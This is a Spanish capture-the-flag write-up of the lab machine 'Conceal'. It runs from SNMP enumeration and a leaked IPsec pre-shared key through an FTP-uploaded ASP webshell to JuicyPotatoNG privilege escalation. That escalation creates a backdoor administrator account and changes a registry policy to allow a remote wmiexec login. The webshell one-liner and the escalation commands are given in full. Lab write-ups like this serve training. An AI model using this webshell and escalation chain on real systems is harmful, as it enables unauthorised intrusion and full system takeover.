---

---
-----------------
- Tags: #udp #snmp #ike #ipsec #IIS #nishang #SeImpersonatePrivilege 
- ---------
## Ténicas utilizadas
- UDP Scan  
- SNMP Enumeration  
- Enumerating Ike Hosts - ike-scan  
- Installing and configuring Strongswan (IPSEC/VPN) [ipsec.secret/ipsec.conf]  
- Performing a new scan through IPSEC  
- Abusing IIS - File Upload via FTP (Malicious ASP file) [RCE]  
- Nishang Invoke-PowerShellTcp Shell  
- Abusing SeImpersonatePrivilege [Privilege Escalation]
## Procedimiento
![[Pasted image 20230903165357.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, podemos ver los siguientes puertos con sus respectivos servicios y versiones:
```ruby
# sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG Scan 10.10.10.116
[sudo] contraseña para sexcott: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 09:11 PDT
Initiating SYN Stealth Scan at 09:11
Scanning 10.10.10.116 [65535 ports]
Completed SYN Stealth Scan at 09:11, 27.33s elapsed (65535 total ports)
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
           Raw packets sent: 131070 (5.767MB) | Rcvd: 0 (0B)
```

-----------
#### UDP Scan 
Con el escaneo de **nmap** no llegamos a encontrar ningun servicio **TCP**, sin embargo, podemos hacer un escaneo también sobre puertos que esten activos por **UDP**:
```ruby
# nmap -sU -T5 --top-ports 500 10.10.10.116 -oN UDP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 09:12 PDT
Nmap scan report for 10.10.10.116
Host is up (0.091s latency).
Not shown: 498 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp
500/udp open  isakmp

Nmap done: 1 IP address (1 host up) scanned in 18.25 seconds
```

Encontramos el puerto **161** que suele corresponder a **SNMP** y el puerto **500** que de primera pertenece a **IKE**

------------
#### SNMP Enumeration  
Viendo que el servicio **SNMP** esta activado, podemos intentar algunas cosas que vienen contempladas en el siguiente [articulo] de **HackTricks**.
Para empezar, intentaremos dar con la **Community String** correcta, para esto, aplicaremos fuerza bruta con una herramienta que se llama **OneSixtyOne**:
```ruby
# onesixtyone 10.10.10.10
```

Y cuando la encuentra nos la mustra por pantalla, como en este caso:
```ruby
Scanning 1 hosts, 2 communities
10.10.10.116 [public] Hardware: Intel64 Family 6 Model 85 Stepping 7 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
```

Con **nmap** podemos intentar enumerar un poco la maquina victima a través de **SNMP**, con este comando podemos ver los puertos internos(tanto los de UDP como los de TCP):
```ruby
# nmap --script=snmp-netstat.nse -p161 -sU 10.10.10.116
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 09:21 PDT
Nmap scan report for 10.10.10.116
Host is up (0.099s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  0.0.0.0:54872        *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:63265   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:63266      *:*

Nmap done: 1 IP address (1 host up) scanned in 8.85 seconds
```

Tambien podemos listar proceso que este corriendo en la maquina:
```ruby
# nmap --script snmp-process.nse -p161 -sU 10.10.10.10
```

Y vemos un listado de procesos corriendo en la maquina:
```ruby
PORT    STATE SERVICE
161/udp open  snmp
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   100: 
|     Name: MpCmdRun.exe
|     Path: C:\Program Files\Windows Defender\
|     Params:  Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59 -Reinvoke
|   300: 
|     Name: smss.exe
|   324: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork
|   400: 
|     Name: csrss.exe
|   480: 
|     Name: wininit.exe
|   488: 
|     Name: csrss.exe
|   544: 
|     Name: winlogon.exe
|   592: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService
|   624: 
|     Name: services.exe
|   632: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   720: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch
|   740: 
|     Name: fontdrvhost.exe
|   748: 
|     Name: fontdrvhost.exe
|   840: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS
|   936: 
|     Name: dwm.exe
|   964: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   996: 
|     Name: vmacthlp.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1004: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted
|   1032: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs
|   1144: 
|     Name: MpCmdRun.exe
|     Path: C:\Program Files\Windows Defender\
|     Params:  Scan -ScheduleJob -ScanTrigger 55
|   1152: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService
|   1232: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1316: 
|     Name: Memory Compression
|   1324: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted
|   1332: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1436: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   1596: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel
|   1756: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k apphost
|   1764: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k utcsvc
|   1776: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k ftpsvc
|   1864: 
|     Name: SecurityHealthService.exe
|   1884: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   1924: 
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1936: 
|     Name: ManagementAgentHost.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
|   1944: 
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   1956: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k iissvcs
|   1972: 
|     Name: MsMpEng.exe
|   2228: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted
|   2460: 
|     Name: taskhostw.exe
|   2520: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted
|   2812: 
|     Name: SearchIndexer.exe
|     Path: C:\Windows\system32\
|     Params: /Embedding
|   2896: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   3048: 
|     Name: LogonUI.exe
|     Params:  /flags:0x0 /state0:0xa3a9b855 /state1:0x41c64e6d
|   3068: 
|     Name: dllhost.exe
|     Path: C:\Windows\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3096: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   3152: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceAndNoImpersonation
|   3336: 
|     Name: NisSrv.exe
|   3636: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k smphost
|   3660: 
|     Name: conhost.exe
|     Path: \??\C:\Windows\system32\
|     Params: 0x4
|   3780: 
|     Name: svchost.exe
|   3956: 
|     Name: MpCmdRun.exe
|     Path: C:\Program Files\Windows Defender\
|     Params:  -IdleTask -TaskName WdCacheMaintenance
|   3964: 
|     Name: conhost.exe
|     Path: \??\C:\Windows\system32\
|     Params: 0x4
|   3972: 
|     Name: WmiPrvSE.exe
|_    Path: C:\Windows\system32\wbem\

Nmap done: 1 IP address (1 host up) scanned in 45.65 seconds
```

Bueno, como de antes hemos conseguido la **Community String** correspondiente, podemos ahora intentar dar un paseo con **SNMP** con herramientas como **SnmpBulkWalk** o **SnmpWalk**, en este caso usaremos la primera:
```ruby
# snmpbulkwalk -c plublic -v2c 10.10.10.10
```

Miramos mucha traya, pero encontramos una posible contraseña:
```ruby
[...]
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
[...]
```

Lo podemos intentar crackear en **CrackStation**:
![[Pasted image 20230905092759.png]]

----------
#### Enumerating Ike Hosts - ike-scan
Y encontramos una posible contraseña. Como tenemos una contraseña, que de primeras no sabemos para que pueda servir, podemos usarla para intentar autenticarnos al gestor de **VPN** que hay en el puerto 500\\UDP que gestiona **IKE**. Usaremos la herramienta **StrongSwan** para hacer esta tarea. Para hacer uso de este tenemos que colocar el secreto (contraseña) en el archivo **/etc/ipsec.secrets**:
```
# ipsec.secrets - StrongWan IPsec secrets file
%any : PSK "<password>"
```

Con la herramienta **ike-scan** sacaremos un poco más informacion necesaria para conectarnos:
```ruby
# ike-scan 10.10.10.10 -M
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.10.116	Main Mode Handshake returned
	HDR=(CKY-R=14c1d03d65425331)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
	VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
	VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
	VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
	VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
	VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
	VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.114 seconds (8.78 hosts/sec).  1 returned handshake; 0 returned notify
```

---------------------
#### Installing and configuring Strongswan (IPSEC/VPN) [ipsec.secret/ipsec.conf]  
Bien, con esta informacion recolectada, podemos adaptar nuestro archivo **/etc/ipsec.conf** para realizar la conexión correctamente:
```ruby
conn conceal
	keyexchange=ikev1
	type=transport
	left=10.10.14.13
	right=10.10.10.10
	auto=add #ondemand start ignore
	authby=secret
	ike=3des-sha1-modp1024
	esp=3des-sha1
	rightsubnet=10.10.10.10[tcp]
```

y ahora, en consola pondremos este comando para reiniciar el servicio:
```ruby
# ipsec restart
Stopping strongSwan IPsec...
Starting strongSwan 5.9.11 IPsec [starter]...
```

Para conectarnos ahora seria ejecutar este comando
```ruby
# ipsec up conceal
initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
generating ID_PROT request 0 [ SA V V V V V ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (236 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (208 bytes)
parsed ID_PROT response 0 [ SA V V V V V V ]
received MS NT5 ISAKMPOAKLEY vendor ID
received NAT-T (RFC 3947) vendor ID
received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
received FRAGMENTATION vendor ID
received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (244 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (260 bytes)
parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (100 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (68 bytes)
parsed ID_PROT response 0 [ ID HASH ]
IKE_SA conceal[1] established between 10.10.14.9[10.10.14.9]...10.10.10.116[10.10.10.116]
scheduling reauthentication in 10158s
maximum IKE_SA lifetime 10698s
generating QUICK_MODE request 3448779197 [ HASH SA No ID ID ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (220 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.9[500] (188 bytes)
parsed QUICK_MODE response 3448779197 [ HASH SA No ID ID ]
selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
CHILD_SA conceal{1} established with SPIs cd92132c_i f941c2ce_o and TS 10.10.14.9/32 === 10.10.10.116/32[tcp]
generating QUICK_MODE request 3448779197 [ HASH ]
sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (60 bytes)
connection 'conceal' established successfully
```

------------
#### Performing a new scan through IPSEC  
Con este configurado, ahora si podemos tirar un **nmap** para ver los puertos abiertos:
```
# nmap -p- --sS --min-rate 5000 -sT -Pn -n -vvv -oG Scan 10.10.10.10
```

Y ahora escanemos los servicios y versiones
```ruby
# nmap -sCV -p21,80,135,139,445,49664,49665,49666,49667,49668,49669,49670 10.10.10.116 -sT -oN Ports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 09:34 PDT
Nmap scan report for 10.10.10.116
Host is up (0.092s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-05T16:35:32
|_  start_date: 2023-09-05T16:08:28
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.96 seconds
```

---------
#### Abusing IIS - File Upload via FTP (Malicious ASP file) [RCE]  
Vemos que el puerto **21** de **FTP** esta activo, además, permite conexiones como **Anonimos**. Tenemos un puerto **80** el cual aloja un **IIS**. En **FTP** ademas de tener la capacidad de conectarnos, también podemos escribir archivos. Al subir uno, podemos deducir que puede estar relacionado con el **IIS** pero al visitar la ruta no vemos nada:
![[Pasted image 20230905094509.png]]

Haciendo un poco de **Guessing** damos con la ruta **Upload** la cual tiene capacidad de **directory list** y vemos también el archivo que acabamos de subir:
![[Pasted image 20230905094524.png]]

Vamos aprovecharnos de esto para subir una webshell en **Asp-Aspx** dado que es un **IIS** y sabemos de lleno que lo interpretara. Como el CMD.aspx comun da problemas, usaremos este OneLine escrito en **ASP**:
```asp
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

--------
#### Nishang Invoke-PowerShellTcp Shell
Ahora con la ejecución remota de comandos podemos intentar entablarnos una reverse shell con el [repositorio]() de nishan, asi como lo hemos echo en incontables [[Most Important - Bart|ocasiones]].

-----------
#### Abusing SeImpersonatePrivilege [Privilege Escalation]
Si hacemos un `PS > whoami /priv` observamos que contamos con el privilegio **SeImpersonatePrivilege** tal y como lo vimos en la [[Most Important - Bart|maquina]] pasada. En esta ocasion, en vez de tirar de **NetCat** lo haremos cambiando algunos registros para poder conectarnos con **wmiexec**:
```
PS > .\JuicyPotatoNG.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user sexcott sexcott123$! /add" -c CLSID 
	JuicyPotatoNG
	by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 1337 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful! 
```

Esto creara un nuevo usuario, podemos validar esto con **CrackMapExec**. Ahora, configuraremos los registros para poder lograr conectarnos con **Impacket-Wmiexec**:
```powershell
PS > .\JuicyPotatoNG.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators sexcott /add" -c CLSID
```

Y por ultimo:
```powershell
PS > .\JuicyPotatoNG.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -c CLSID
```

Ahora validamos con **CrackMapExec**, si coloca **Pwned!** es por que podemos conectarnos con **Wmiexec**:
```ruby
# sudo crackmapexec smb 10.10.10.116 -u sexcott -p 'sexcott123!$'
SMB         10.10.10.116    445    CONCEAL          [*] Windows 10.0 Build 15063 x64 (name:CONCEAL) (domain:Conceal) (signing:False) (SMBv1:False)
SMB         10.10.10.116    445    CONCEAL          [+] Conceal\sexcott:sexcott123!$ (Pwn3d!)
```

Para finalizar, ejecutamos una **CMD.exe** con **WmiExec**:
```
# impacket-wmiexec WORKGROUP/sexcott@10.10.10.10 cmd.exe
```





 

